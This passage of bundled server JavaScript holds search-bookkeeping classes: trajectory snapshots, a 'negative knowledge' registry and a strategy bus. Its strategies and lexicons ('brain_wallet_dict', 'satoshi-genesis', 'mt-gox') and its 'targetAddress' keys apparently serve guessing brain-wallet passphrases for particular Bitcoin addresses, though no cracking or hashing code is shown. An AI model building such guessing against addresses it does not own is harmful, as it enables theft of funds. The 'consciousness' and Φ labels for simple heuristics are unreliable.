        confidence = Math.max(0.1, Math.min(1, confidence));
        const reasoning = this.generatePredictionReasoning(metrics);
        return { suggestedCoords, confidence, reasoning };
      }
      generatePredictionReasoning(metrics) {
        const parts = [];
        if (metrics.phiGradient > 0.1) {
          parts.push("\u03A6 improving - continue in momentum direction");
        } else if (metrics.phiGradient < -0.1) {
          parts.push("\u03A6 declining - consider course correction");
        }
        if (metrics.plateauDetected) {
          parts.push("Plateau detected - recommend exploration");
        }
        if (metrics.efficiency < 0.3) {
          parts.push("Low efficiency - try more directed search");
        } else if (metrics.efficiency > 0.7) {
          parts.push("High efficiency - good trajectory");
        }
        if (metrics.regimeTransitions > 3) {
          parts.push("Many regime transitions - near interesting boundary");
        }
        return parts.join(". ") || "Standard exploration";
      }
      takeSnapshot(targetAddress, consciousness) {
        const topology = geometricMemory.getBasinTopology();
        const summary = geometricMemory.getManifoldSummary();
        const trajectories = this.getTrajectoriesForTarget(targetAddress);
        const latestTrajectory = trajectories[trajectories.length - 1];
        const recentWaypoints = latestTrajectory?.waypoints.slice(-10) || [];
        let recentVelocity = 0;
        let momentum = [];
        if (recentWaypoints.length > 1) {
          recentVelocity = recentWaypoints.reduce((sum, w) => sum + w.fisherDistance, 0) / recentWaypoints.length;
          momentum = this.computeMomentumVector(recentWaypoints, Math.min(5, recentWaypoints.length));
        }
        const basinTopology = {
          attractorCoords: topology.attractorCoords.length === 64 ? topology.attractorCoords : [...topology.attractorCoords, ...new Array(64 - topology.attractorCoords.length).fill(0)],
          volume: topology.volume,
          curvature: topology.curvature,
          boundaryDistances: topology.boundaryDistances,
          resonanceShells: topology.resonanceShells,
          flowField: topology.flowField,
          holes: topology.holes,
          effectiveScale: topology.effectiveScale,
          kappaAtScale: topology.kappaAtScale
        };
        const snapshot = {
          id: nanoid2(),
          takenAt: (/* @__PURE__ */ new Date()).toISOString(),
          targetAddress,
          consciousness,
          basinTopology,
          activeGenerators: [],
          generatorOutputQueue: 0,
          negativeKnowledgeSummary: {
            totalExclusions: 0,
            recentAdditions: 0,
            coverageGain: 0
          },
          currentTrajectory: {
            totalWaypoints: latestTrajectory?.waypoints.length || 0,
            recentVelocity,
            momentum
          },
          activeStreams: [],
          manifoldCoverage: summary.exploredVolume,
          resonanceVolume: summary.resonanceClusters * 0.1,
          explorationEfficiency: summary.avgPhi
        };
        this.snapshots.set(snapshot.id, snapshot);
        console.log(`[TemporalGeometry] Took snapshot ${snapshot.id}`);
        return snapshot;
      }
      compareSnapshots(snapshot1Id, snapshot2Id) {
        const s1 = this.snapshots.get(snapshot1Id);
        const s2 = this.snapshots.get(snapshot2Id);
        if (!s1 || !s2) return null;
        return {
          basinDrift: Math.abs(s2.basinTopology.volume - s1.basinTopology.volume),
          volumeChange: s2.basinTopology.volume - s1.basinTopology.volume,
          informationGain: s2.manifoldCoverage - s1.manifoldCoverage,
          newHoles: Math.max(0, s2.basinTopology.holes.length - s1.basinTopology.holes.length),
          closedHoles: Math.max(0, s1.basinTopology.holes.length - s2.basinTopology.holes.length),
          phiChange: s2.consciousness.phi - s1.consciousness.phi
        };
      }
      getTrajectory(trajectoryId) {
        return this.trajectories.get(trajectoryId);
      }
      completeTrajectory(trajectoryId) {
        const trajectory = this.trajectories.get(trajectoryId);
        if (!trajectory) {
          console.warn(`[TemporalGeometry] Trajectory ${trajectoryId} not found for completion`);
          return null;
        }
        const waypointCount = trajectory.waypoints.length;
        const finalPhi = waypointCount > 0 ? trajectory.waypoints[waypointCount - 1].consciousness.phi : 0;
        this.trajectories.delete(trajectoryId);
        console.log(`[TemporalGeometry] Completed and removed trajectory ${trajectoryId} (${waypointCount} waypoints, final \u03A6=${finalPhi.toFixed(3)})`);
        return { waypointCount, finalPhi };
      }
      getTrajectoriesForTarget(targetAddress) {
        const result = [];
        for (const traj of Array.from(this.trajectories.values())) {
          if (traj.targetAddress === targetAddress) {
            result.push(traj);
          }
        }
        return result;
      }
      getRecentSnapshots(limit = 10) {
        return Array.from(this.snapshots.values()).sort((a, b) => b.id.localeCompare(a.id)).slice(0, limit);
      }
      computeVariance(values) {
        if (values.length < 2) return 0;
        const mean = values.reduce((a, b) => a + b, 0) / values.length;
        return values.reduce((sum, v) => sum + (v - mean) ** 2, 0) / values.length;
      }
    };
    temporalGeometry = new TemporalGeometry();
  }
});

// server/negative-knowledge-registry.ts
var negative_knowledge_registry_exports = {};
__export(negative_knowledge_registry_exports, {
  NegativeKnowledgeRegistry: () => NegativeKnowledgeRegistry,
  negativeKnowledgeRegistry: () => negativeKnowledgeRegistry
});
import { nanoid as nanoid3 } from "nanoid";
import * as fs6 from "fs";
import * as path6 from "path";
var NEGATIVE_KNOWLEDGE_FILE, NegativeKnowledgeRegistry, negativeKnowledgeRegistry;
var init_negative_knowledge_registry = __esm({
  "server/negative-knowledge-registry.ts"() {
    "use strict";
    init_qig_universal();
    NEGATIVE_KNOWLEDGE_FILE = path6.join(process.cwd(), "data", "negative-knowledge.json");
    NegativeKnowledgeRegistry = class {
      contradictions = /* @__PURE__ */ new Map();
      barriers = /* @__PURE__ */ new Map();
      falsePatternClasses = /* @__PURE__ */ new Map();
      eraExclusions = /* @__PURE__ */ new Map();
      totalExclusions = 0;
      estimatedComputeSaved = 0;
      lastPruned = (/* @__PURE__ */ new Date()).toISOString();
      CONTRADICTION_CONFIRMATION_THRESHOLD = 3;
      BARRIER_CROSS_THRESHOLD = 5;
      constructor() {
        this.load();
        console.log("[NegativeKnowledge] Initialized registry");
      }
      load() {
        try {
          if (fs6.existsSync(NEGATIVE_KNOWLEDGE_FILE)) {
            const data = JSON.parse(fs6.readFileSync(NEGATIVE_KNOWLEDGE_FILE, "utf-8"));
            this.contradictions = new Map(Object.entries(data.contradictions || {}));
            this.barriers = new Map(Object.entries(data.barriers || {}));
            this.falsePatternClasses = new Map(Object.entries(data.falsePatternClasses || {}));
            this.eraExclusions = new Map(Object.entries(data.eraExclusions || {}));
            this.totalExclusions = data.totalExclusions || 0;
            this.estimatedComputeSaved = data.estimatedComputeSaved || 0;
            this.lastPruned = data.lastPruned || (/* @__PURE__ */ new Date()).toISOString();
            console.log(`[NegativeKnowledge] Loaded ${this.contradictions.size} contradictions, ${this.barriers.size} barriers`);
          }
        } catch {
          console.log("[NegativeKnowledge] Starting with fresh registry");
        }
      }
      save() {
        try {
          const dir = path6.dirname(NEGATIVE_KNOWLEDGE_FILE);
          if (!fs6.existsSync(dir)) {
            fs6.mkdirSync(dir, { recursive: true });
          }
          const data = {
            contradictions: Object.fromEntries(this.contradictions),
            barriers: Object.fromEntries(this.barriers),
            falsePatternClasses: Object.fromEntries(this.falsePatternClasses),
            eraExclusions: Object.fromEntries(this.eraExclusions),
            totalExclusions: this.totalExclusions,
            estimatedComputeSaved: this.estimatedComputeSaved,
            lastPruned: this.lastPruned
          };
          fs6.writeFileSync(NEGATIVE_KNOWLEDGE_FILE, JSON.stringify(data, null, 2));
        } catch (error) {
          console.error("[NegativeKnowledge] Save error:", error);
        }
      }
      recordContradiction(type, pattern, basinRegion, evidence, affectedGenerators = []) {
        const existing = this.findSimilarContradiction(pattern);
        if (existing) {
          existing.confirmedCount++;
          existing.evidence.push(...evidence);
          existing.computeSaved += this.estimateComputeSavings(pattern);
          if (existing.confirmedCount >= this.CONTRADICTION_CONFIRMATION_THRESHOLD) {
            console.log(`[NegativeKnowledge] Contradiction "${pattern}" confirmed (${existing.confirmedCount} occurrences)`);
          }
          this.save();
          return existing.id;
        }
        const id = nanoid3();
        const contradiction = {
          id,
          type,
          pattern,
          affectedGenerators,
          basinRegion,
          evidence,
          hypothesesExcluded: this.estimateHypothesesExcluded(pattern),
          computeSaved: this.estimateComputeSavings(pattern),
          createdAt: (/* @__PURE__ */ new Date()).toISOString(),
          confirmedCount: 1
        };
        this.contradictions.set(id, contradiction);
        this.totalExclusions++;
        this.estimatedComputeSaved += contradiction.computeSaved;
        console.log(`[NegativeKnowledge] New contradiction: "${pattern}" (type: ${type})`);
        this.save();
        return id;
      }
      findSimilarContradiction(pattern) {
        const normalized = pattern.toLowerCase().trim();
        const contradictionsList = Array.from(this.contradictions.values());
        for (const contradiction of contradictionsList) {
          const existingNorm = contradiction.pattern.toLowerCase().trim();
          if (existingNorm === normalized) {
            return contradiction;
          }
          if (this.levenshteinDistance(existingNorm, normalized) < 3) {
            return contradiction;
          }
        }
        return null;
      }
      levenshteinDistance(a, b) {
        if (a.length === 0) return b.length;
        if (b.length === 0) return a.length;
        const matrix = [];
        for (let i = 0; i <= b.length; i++) {
          matrix[i] = [i];
        }
        for (let j = 0; j <= a.length; j++) {
          matrix[0][j] = j;
        }
        for (let i = 1; i <= b.length; i++) {
          for (let j = 1; j <= a.length; j++) {
            const cost = a[j - 1] === b[i - 1] ? 0 : 1;
            matrix[i][j] = Math.min(
              matrix[i - 1][j] + 1,
              matrix[i][j - 1] + 1,
              matrix[i - 1][j - 1] + cost
            );
          }
        }
        return matrix[b.length][a.length];
      }
      recordGeometricBarrier(center, radius, reason) {
        const existing = this.findNearbyBarrier(center, radius);
        if (existing) {
          existing.crossings++;
          existing.repulsionStrength = Math.min(1, existing.repulsionStrength + 0.1);
          if (existing.crossings >= this.BARRIER_CROSS_THRESHOLD) {
            console.log(`[NegativeKnowledge] Barrier at [${center.slice(0, 3).join(", ")}...] confirmed`);
          }
          this.save();
          return existing.id;
        }
        const id = nanoid3();
        const barrier = {
          id,
          center,
          radius,
          repulsionStrength: 0.5,
          reason,
          detectedAt: (/* @__PURE__ */ new Date()).toISOString(),
          crossings: 1
        };
        this.barriers.set(id, barrier);
        console.log(`[NegativeKnowledge] New barrier detected: ${reason}`);
        this.save();
        return id;
      }
      findNearbyBarrier(center, radius) {
        const barriersList = Array.from(this.barriers.values());
        for (const barrier of barriersList) {
          const distance = fisherCoordDistance(center, barrier.center);
          if (distance < barrier.radius + radius) {
            return barrier;
          }
        }
        return null;
      }
      recordFalsePatternClass(className, examples, avgPhi = 0) {
        const existing = this.falsePatternClasses.get(className);
        if (existing) {
          existing.examples.push(...examples);
          existing.count += examples.length;
          existing.avgPhiAtFailure = (existing.avgPhiAtFailure + avgPhi) / 2;
          existing.lastUpdated = (/* @__PURE__ */ new Date()).toISOString();
        } else {
          this.falsePatternClasses.set(className, {
            className,
            examples,
            count: examples.length,
            avgPhiAtFailure: avgPhi,
            lastUpdated: (/* @__PURE__ */ new Date()).toISOString()
          });
        }
        this.totalExclusions += examples.length;
        console.log(`[NegativeKnowledge] False pattern class "${className}": ${examples.length} examples`);
        this.save();
      }
      recordEraExclusion(era, patterns, reason) {
        const existing = this.eraExclusions.get(era);
        if (existing) {
          existing.excludedPatterns.push(...patterns);
        } else {
          this.eraExclusions.set(era, {
            era,
            excludedPatterns: patterns,
            reason
          });
        }
        console.log(`[NegativeKnowledge] Era exclusion for ${era}: ${patterns.length} patterns`);
        this.save();
      }
      isExcluded(hypothesis, era) {
        const normalized = hypothesis.toLowerCase().trim();
        const contradictionsList = Array.from(this.contradictions.values());
        for (const contradiction of contradictionsList) {
          if (normalized.includes(contradiction.pattern.toLowerCase())) {
            return {
              excluded: true,
              reason: `Matches proven-false pattern: ${contradiction.pattern}`,
              type: contradiction.type
            };
          }
        }
        const patternClassesList = Array.from(this.falsePatternClasses.entries());
        for (const [className, patternClass] of patternClassesList) {
          for (const example of patternClass.examples) {
            if (normalized.includes(example.toLowerCase())) {
              return {
                excluded: true,
                reason: `Matches false pattern class: ${className}`,
                type: "false_pattern_class"
              };
            }
          }
        }
        if (era) {
          const exclusion = this.eraExclusions.get(era);
          if (exclusion) {
            for (const pattern of exclusion.excludedPatterns) {
              if (normalized.includes(pattern.toLowerCase())) {
                return {
                  excluded: true,
                  reason: `Era mismatch: pattern "${pattern}" excluded for era ${era}`,
                  type: "era_mismatch"
                };
              }
            }
          }
        }
        return { excluded: false };
      }
      isInBarrierZone(coords) {
        const barriersList = Array.from(this.barriers.values());
        for (const barrier of barriersList) {
          const distance = fisherCoordDistance(coords, barrier.center);
          if (distance < barrier.radius) {
            const repulsionVector = coords.map((c, i) => {
              const diff = c - (barrier.center[i] || 0);
              return diff / Math.max(1e-3, distance) * barrier.repulsionStrength;
            });
            return {
              inBarrier: true,
              barrier,
              repulsionVector
            };
          }
        }
        return { inBarrier: false };
      }
      getAffectedGenerators(hypothesis) {
        const affected = /* @__PURE__ */ new Set();
        const normalized = hypothesis.toLowerCase().trim();
        const contradictionsList = Array.from(this.contradictions.values());
        for (const contradiction of contradictionsList) {
          if (normalized.includes(contradiction.pattern.toLowerCase())) {
            contradiction.affectedGenerators.forEach((g) => affected.add(g));
          }
        }
        return Array.from(affected);
      }
      propagateToGenerators(generatorIds) {
        const result = [];
        const contradictionsList = Array.from(this.contradictions.values());
        for (const generatorId of generatorIds) {
          let exclusions = 0;
          for (const contradiction of contradictionsList) {
            if (!contradiction.affectedGenerators.includes(generatorId)) {
              contradiction.affectedGenerators.push(generatorId);
              exclusions++;
            }
          }
          result.push({ generatorId, exclusions });
        }
        if (result.some((r) => r.exclusions > 0)) {
          this.save();
        }
        return result;
      }
      getSummary() {
        const falsePatternClassesObj = {};
        const patternClassesList = Array.from(this.falsePatternClasses.entries());
        for (const [key, value] of patternClassesList) {
          falsePatternClassesObj[key] = {
            count: value.count,
            examples: value.examples,
            lastUpdated: value.lastUpdated
          };
        }
        const eraExclusionsObj = {};
        const eraExclusionsList = Array.from(this.eraExclusions.entries());
        for (const [key, value] of eraExclusionsList) {
          eraExclusionsObj[key] = value.excludedPatterns;
        }
        return {
          contradictions: Array.from(this.contradictions.values()),
          falsePatternClasses: falsePatternClassesObj,
          geometricBarriers: Array.from(this.barriers.values()).map((b) => ({
            center: b.center,
            radius: b.radius,
            curvature: b.repulsionStrength,
            reason: b.reason
          })),
          eraExclusions: eraExclusionsObj,
          totalExclusions: this.totalExclusions,
          estimatedComputeSaved: this.estimatedComputeSaved,
          lastPruned: this.lastPruned
        };
      }
      getStats() {
        const confirmedContradictions = Array.from(this.contradictions.values()).filter((c) => c.confirmedCount >= this.CONTRADICTION_CONFIRMATION_THRESHOLD).length;
        const confirmedBarriers = Array.from(this.barriers.values()).filter((b) => b.crossings >= this.BARRIER_CROSS_THRESHOLD).length;
        return {
          contradictions: this.contradictions.size,
          confirmedContradictions,
          barriers: this.barriers.size,
          confirmedBarriers,
          falseClasses: this.falsePatternClasses.size,
          totalExclusions: this.totalExclusions,
          computeSaved: this.estimatedComputeSaved
        };
      }
      prune() {
        let removed = 0;
        const now = /* @__PURE__ */ new Date();
        const maxAge = 7 * 24 * 60 * 60 * 1e3;
        const contradictionsList = Array.from(this.contradictions.entries());
        for (const [id, contradiction] of contradictionsList) {
          const age = now.getTime() - new Date(contradiction.createdAt).getTime();
          if (age > maxAge && contradiction.confirmedCount < this.CONTRADICTION_CONFIRMATION_THRESHOLD) {
            this.contradictions.delete(id);
            removed++;
          }
        }
        const barriersList = Array.from(this.barriers.entries());
        for (const [id, barrier] of barriersList) {
          const age = now.getTime() - new Date(barrier.detectedAt).getTime();
          if (age > maxAge && barrier.crossings < this.BARRIER_CROSS_THRESHOLD) {
            this.barriers.delete(id);
            removed++;
          }
        }
        this.lastPruned = now.toISOString();
        this.save();
        return {
          removed,
          remaining: this.contradictions.size + this.barriers.size
        };
      }
      estimateHypothesesExcluded(pattern) {
        const baseExclusion = 100;
        const lengthFactor = Math.max(1, 10 - pattern.length);
        return baseExclusion * lengthFactor;
      }
      estimateComputeSavings(pattern) {
        return this.estimateHypothesesExcluded(pattern) * 10;
      }
    };
    negativeKnowledgeRegistry = new NegativeKnowledgeRegistry();
  }
});

// server/strategy-knowledge-bus.ts
import { writeFileSync as writeFileSync6, readFileSync as readFileSync8, existsSync as existsSync7 } from "fs";
var StrategyKnowledgeBus, strategyKnowledgeBus;
var init_strategy_knowledge_bus = __esm({
  "server/strategy-knowledge-bus.ts"() {
    "use strict";
    init_knowledge_compression_engine();
    init_temporal_geometry();
    init_negative_knowledge_registry();
    StrategyKnowledgeBus = class {
      strategies = /* @__PURE__ */ new Map();
      sharedKnowledge = /* @__PURE__ */ new Map();
      transferHistory = [];
      crossStrategyPatterns = /* @__PURE__ */ new Map();
      subscriptions = [];
      scaleMappings = /* @__PURE__ */ new Map();
      PERSISTENCE_PATH = "./knowledge_bus_state.json";
      MAX_TRANSFER_HISTORY = 1e3;
      CROSS_STRATEGY_THRESHOLD = 0.7;
      constructor() {
        this.load();
        this.registerDefaultStrategies();
      }
      registerDefaultStrategies() {
        const defaultStrategies = [
          {
            id: "era_patterns",
            name: "Era Pattern Analysis",
            generatorTypes: ["temporal", "grammatical"],
            compressionMethods: ["era_clustering", "temporal_entropy"],
            resonanceRange: [0.3, 0.7],
            preferredRegimes: ["linear", "geometric"]
          },
          {
            id: "brain_wallet_dict",
            name: "Brain Wallet Dictionary",
            generatorTypes: ["grammatical", "structural"],
            compressionMethods: ["dictionary_hash", "frequency_encode"],
            resonanceRange: [0.4, 0.9],
            preferredRegimes: ["linear"]
          },
          {
            id: "bitcoin_terms",
            name: "Bitcoin Terminology",
            generatorTypes: ["grammatical", "cross_format"],
            compressionMethods: ["term_graph", "semantic_embed"],
            resonanceRange: [0.5, 0.95],
            preferredRegimes: ["geometric"]
          },
          {
            id: "linguistic",
            name: "Linguistic Patterns",
            generatorTypes: ["grammatical", "structural"],
            compressionMethods: ["ngram_compress", "phonetic_hash"],
            resonanceRange: [0.2, 0.8],
            preferredRegimes: ["linear", "geometric"]
          },
          {
            id: "qig_basin_search",
            name: "QIG Basin Search",
            generatorTypes: ["geometric", "structural"],
            compressionMethods: ["basin_topology", "curvature_encode"],
            resonanceRange: [0.6, 1],
            preferredRegimes: ["geometric", "breakdown"]
          },
          {
            id: "historical_autonomous",
            name: "Historical Autonomous",
            generatorTypes: ["temporal", "cross_format"],
            compressionMethods: ["archive_chain", "temporal_graph"],
            resonanceRange: [0.3, 0.85],
            preferredRegimes: ["linear", "geometric"]
          },
          {
            id: "cross_format",
            name: "Cross Format Analysis",
            generatorTypes: ["cross_format", "geometric"],
            compressionMethods: ["format_bridge", "universal_hash"],
            resonanceRange: [0.4, 0.95],
            preferredRegimes: ["geometric", "breakdown"]
          }
        ];
        for (const strategy of defaultStrategies) {
          if (!this.strategies.has(strategy.id)) {
            this.strategies.set(strategy.id, strategy);
          }
        }
      }
      registerStrategy(capability) {
        this.strategies.set(capability.id, capability);
        console.log(`[KnowledgeBus] Registered strategy: ${capability.name}`);
      }
      publishKnowledge(sourceStrategy, generatorId, pattern, context) {
        const entryId = `kb_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        const entry = {
          id: entryId,
          sourceStrategy,
          generatorId,
          pattern,
          phi: context.phi,
          kappaEff: context.kappaEff,
          regime: context.regime,
          sharedAt: (/* @__PURE__ */ new Date()).toISOString(),
          consumedBy: [],
          transformations: []
        };
        this.sharedKnowledge.set(entryId, entry);
        this.notifySubscribers({
          id: `transfer_${Date.now()}`,
          type: "publish",
          sourceStrategy,
          targetStrategy: null,
          generatorId,
          pattern,
          phi: context.phi,
          kappaEff: context.kappaEff,
          timestamp: entry.sharedAt,
          success: true
        });
        this.detectCrossStrategyPatterns(pattern, sourceStrategy, context);
        this.save();
        return entryId;
      }
      consumeKnowledge(targetStrategy, entryId, transformation) {
        const entry = this.sharedKnowledge.get(entryId);
        if (!entry) return null;
        if (!entry.consumedBy.includes(targetStrategy)) {
          entry.consumedBy.push(targetStrategy);
        }
        if (transformation) {
          entry.transformations.push({
            strategy: targetStrategy,
            method: transformation,
            timestamp: (/* @__PURE__ */ new Date()).toISOString()
          });
        }
        this.recordTransfer({
          id: `transfer_${Date.now()}`,
          type: "consume",
          sourceStrategy: entry.sourceStrategy,
          targetStrategy,
          generatorId: entry.generatorId,
          pattern: entry.pattern,
          phi: entry.phi,
          kappaEff: entry.kappaEff,
          timestamp: (/* @__PURE__ */ new Date()).toISOString(),
          success: true,
          transformation
        });
        this.save();
        return entry;
      }
      transferGenerator(sourceStrategy, targetStrategy, generator, scaleAdjustment) {
        const source = this.strategies.get(sourceStrategy);
        const target = this.strategies.get(targetStrategy);
        if (!source || !target) {
          return {
            success: false,
            generator: null,
            scaleTransform: 1,
            fidelityLoss: 1,
            adaptations: ["missing_strategy"]
          };
        }
        const hasMatchingType = generator.type && target.generatorTypes.includes(generator.type);
        const resonanceOverlap = this.computeResonanceOverlap(
          source.resonanceRange,
          target.resonanceRange
        );
        const adaptations = [];
        let fidelityLoss = 0;
        if (!hasMatchingType) {
          adaptations.push("type_adaptation");
          fidelityLoss += 0.1;
        }
        if (resonanceOverlap < 0.5) {
          adaptations.push("resonance_rescale");
          fidelityLoss += 0.15 * (1 - resonanceOverlap);
        }
        const regimeCompat = target.preferredRegimes.some(
          (r) => source.preferredRegimes.includes(r)
        );
        if (!regimeCompat) {
          adaptations.push("regime_bridge");
          fidelityLoss += 0.2;
        }
        const scaleTransform = scaleAdjustment ?? this.computeScaleTransform(source, target);
        const adaptedGenerator = {
          ...generator,
          source: "cross_agent"
        };
        this.recordTransfer({
          id: `transfer_${Date.now()}`,
          type: "generator_transfer",
          sourceStrategy,
          targetStrategy,
          generatorId: generator.id,
          pattern: generator.template,
          phi: generator.confidence,
          kappaEff: generator.curvatureSignature[0] ?? 0,
          timestamp: (/* @__PURE__ */ new Date()).toISOString(),
          success: true,
          transformation: adaptations.join(","),
          scaleAdjustment: scaleTransform
        });
        return {
          success: true,
          generator: adaptedGenerator,
          scaleTransform,
          fidelityLoss,
          adaptations
        };
      }
      computeResonanceOverlap(range1, range2) {
        const overlapStart = Math.max(range1[0], range2[0]);
        const overlapEnd = Math.min(range1[1], range2[1]);
        if (overlapStart >= overlapEnd) return 0;
        const overlapLength = overlapEnd - overlapStart;
        const totalRange = Math.max(range1[1], range2[1]) - Math.min(range1[0], range2[0]);
        return overlapLength / totalRange;
      }
      computeScaleTransform(source, target) {
        const sourceRange = source.resonanceRange[1] - source.resonanceRange[0];
        const targetRange = target.resonanceRange[1] - target.resonanceRange[0];
        return targetRange / sourceRange;
      }
      subscribe(subscriberId, strategyId, patterns, callback) {
        const subscription = {
          subscriberId,
          strategyId,
          patterns,
          callback,
          createdAt: (/* @__PURE__ */ new Date()).toISOString()
        };
        this.subscriptions.push(subscription);
        return () => {
          const idx = this.subscriptions.findIndex((s) => s.subscriberId === subscriberId);
          if (idx >= 0) {
            this.subscriptions.splice(idx, 1);
          }
        };
      }
      notifySubscribers(event) {
        for (const sub of this.subscriptions) {
          const matchesStrategy = sub.strategyId === "*" || sub.strategyId === event.sourceStrategy || sub.strategyId === event.targetStrategy;
          const matchesPattern = sub.patterns.length === 0 || sub.patterns.some((p) => event.pattern.toLowerCase().includes(p.toLowerCase()));
          if (matchesStrategy && matchesPattern) {
            try {
              sub.callback(event);
            } catch (err) {
              console.error(`[KnowledgeBus] Subscription callback error: ${err}`);
            }
          }
        }
      }
      recordTransfer(event) {
        this.transferHistory.push(event);
        if (this.transferHistory.length > this.MAX_TRANSFER_HISTORY) {
          this.transferHistory = this.transferHistory.slice(-this.MAX_TRANSFER_HISTORY);
        }
        this.notifySubscribers(event);
      }
      detectCrossStrategyPatterns(pattern, sourceStrategy, context) {
        const entriesList = Array.from(this.sharedKnowledge.values());
        for (const entry of entriesList) {
          if (entry.sourceStrategy === sourceStrategy) continue;
          const similarity = this.computePatternSimilarity(pattern, entry.pattern);
          if (similarity >= this.CROSS_STRATEGY_THRESHOLD) {
            const patternId = `cross_${sourceStrategy}_${entry.sourceStrategy}_${Date.now()}`;
            const crossPattern = {
              id: patternId,
              patterns: [pattern, entry.pattern],
              strategies: [sourceStrategy, entry.sourceStrategy],
              similarity,
              combinedPhi: (context.phi + entry.phi) / 2,
              discoveredAt: (/* @__PURE__ */ new Date()).toISOString(),
              exploitationCount: 0
            };
            this.crossStrategyPatterns.set(patternId, crossPattern);
            console.log(`[KnowledgeBus] Cross-strategy pattern detected: ${sourceStrategy} <-> ${entry.sourceStrategy} (${(similarity * 100).toFixed(1)}%)`);
          }
        }
      }
      computePatternSimilarity(a, b) {
        const aNorm = a.toLowerCase().trim();
        const bNorm = b.toLowerCase().trim();
        if (aNorm === bNorm) return 1;
        if (aNorm.includes(bNorm) || bNorm.includes(aNorm)) return 0.9;
        const aChars = new Set(aNorm.split(""));
        const bChars = new Set(bNorm.split(""));
        let intersection = 0;
        for (const c of Array.from(aChars)) {
          if (bChars.has(c)) intersection++;
        }
        const union = (/* @__PURE__ */ new Set([...Array.from(aChars), ...Array.from(bChars)])).size;
        return intersection / union;
      }
      getCrossStrategyPatterns() {
        return Array.from(this.crossStrategyPatterns.values());
      }
      exploitCrossPattern(patternId) {
        const pattern = this.crossStrategyPatterns.get(patternId);
        if (pattern) {
          pattern.exploitationCount++;
          this.save();
        }
        return pattern ?? null;
      }
      findCompatibleStrategies(generatorType, regime) {
        const compatible = [];
        const strategiesList = Array.from(this.strategies.entries());
        for (const [id, capability] of strategiesList) {
          if (capability.generatorTypes.includes(generatorType) && capability.preferredRegimes.includes(regime)) {
            compatible.push(id);
          }
        }
        return compatible;
      }
      getKnowledgeForStrategy(strategyId) {
        const strategy = this.strategies.get(strategyId);
        if (!strategy) return [];
        const compatible = [];
        const entriesList = Array.from(this.sharedKnowledge.values());
        for (const entry of entriesList) {
          if (entry.sourceStrategy !== strategyId) {
            compatible.push(entry);
          }
        }
        return compatible;
      }
      integrateExternalSystems() {
        const generators = knowledgeCompressionEngine.getAllGenerators();
        for (const gen of generators) {
          if (gen.confidence > 0.3) {
            this.publishKnowledge(
              gen.source === "cross_agent" ? "cross_agent" : "compression_engine",
              gen.id,
              gen.template,
              {
                phi: gen.confidence,
                kappaEff: gen.curvatureSignature[0] ?? 0,
                regime: "linear"
              }
            );
          }
        }
        const negativeStats = negativeKnowledgeRegistry.getStats();
        if (negativeStats.contradictions > 0) {
          const summary = negativeKnowledgeRegistry.getSummary();
          for (const contradiction of summary.contradictions) {
            this.publishKnowledge(
              "negative_registry",
              contradiction.id,
              `NEGATIVE:${contradiction.pattern}`,
              {
                phi: 0,
                kappaEff: 0,
                regime: "linear"
              }
            );
          }
        }
      }
      getSummary() {
        return {
          strategies: Array.from(this.strategies.keys()),
          sharedKnowledge: Array.from(this.sharedKnowledge.values()),
          crossStrategyPatterns: Array.from(this.crossStrategyPatterns.values()),
          transferHistory: this.transferHistory.slice(-100),
          activeSubscriptions: this.subscriptions.length
        };
      }
      getTransferStats() {
        const publishEvents = this.transferHistory.filter((e) => e.type === "publish").length;
        const consumeEvents = this.transferHistory.filter((e) => e.type === "consume").length;
        const successEvents = this.transferHistory.filter((e) => e.success).length;
        return {
          totalPublished: publishEvents,
          totalConsumed: consumeEvents,
          crossPatterns: this.crossStrategyPatterns.size,
          activeStrategies: this.strategies.size,
          transferSuccessRate: this.transferHistory.length > 0 ? successEvents / this.transferHistory.length : 1
        };
      }
      createScaleInvariantBridge(sourceScale, targetScale, preservedFeatures) {
        const bridgeId = `scale_${sourceScale}_${targetScale}_${Date.now()}`;
        const ratio = targetScale / sourceScale;
        const transformMatrix = [
          ratio,
          0,
          0,
          0,
          0,
          ratio,
          0,
          0,
          0,
          0,
          ratio,
          0,
          0,
          0,
          0,
          1
        ];
        const lossEstimate = Math.abs(1 - ratio) * 0.1;
        this.scaleMappings.set(bridgeId, {
          sourceScale,
          targetScale,
          transformMatrix,
          preservedFeatures,
          lossEstimate
        });
        this.save();
        return bridgeId;
      }
      applyScaleTransform(bridgeId, coords) {
        const mapping = this.scaleMappings.get(bridgeId);
        if (!mapping) return coords;
        const ratio = mapping.targetScale / mapping.sourceScale;
        return coords.map((c) => c * ratio);
      }
      save() {
        try {
          const state = {
            strategies: Array.from(this.strategies.entries()),
            sharedKnowledge: Array.from(this.sharedKnowledge.entries()),
            crossStrategyPatterns: Array.from(this.crossStrategyPatterns.entries()),
            transferHistory: this.transferHistory.slice(-500),
            scaleMappings: Array.from(this.scaleMappings.entries())
          };
          writeFileSync6(this.PERSISTENCE_PATH, JSON.stringify(state, null, 2));
        } catch (err) {
          console.error("[KnowledgeBus] Failed to save state:", err);
        }
      }
      load() {
        try {
          if (existsSync7(this.PERSISTENCE_PATH)) {
            const data = JSON.parse(readFileSync8(this.PERSISTENCE_PATH, "utf-8"));
            if (data.strategies) {
              this.strategies = new Map(data.strategies);
            }
            if (data.sharedKnowledge) {
              this.sharedKnowledge = new Map(data.sharedKnowledge);
            }
            if (data.crossStrategyPatterns) {
              this.crossStrategyPatterns = new Map(data.crossStrategyPatterns);
            }
            if (data.transferHistory) {
              this.transferHistory = data.transferHistory;
            }
            if (data.scaleMappings) {
              this.scaleMappings = new Map(data.scaleMappings);
            }
            console.log(`[KnowledgeBus] Loaded ${this.sharedKnowledge.size} knowledge entries`);
          }
        } catch (err) {
          console.error("[KnowledgeBus] Failed to load state:", err);
        }
      }
    };
    strategyKnowledgeBus = new StrategyKnowledgeBus();
  }
});

// server/cultural-manifold.ts
var CulturalManifoldReconstructor, culturalManifold;
var init_cultural_manifold = __esm({
  "server/cultural-manifold.ts"() {
    "use strict";
    CulturalManifoldReconstructor = class {
      lexicons = /* @__PURE__ */ new Map();
      manifoldCurvature = /* @__PURE__ */ new Map();
      testedPhrases = /* @__PURE__ */ new Set();
      geodesicHistory = [];
      constructor() {
        this.initializeEraLexicons();
      }
      initializeEraLexicons() {
        this.lexicons.set("satoshi-genesis", this.buildSatoshiGenesisLexicon());
        this.lexicons.set("satoshi-late", this.buildSatoshiLateLexicon());
        this.lexicons.set("early-adopter", this.buildEarlyAdopterLexicon());
        this.lexicons.set("silk-road", this.buildSilkRoadLexicon());
        this.lexicons.set("mt-gox", this.buildMtGoxLexicon());
        console.log(
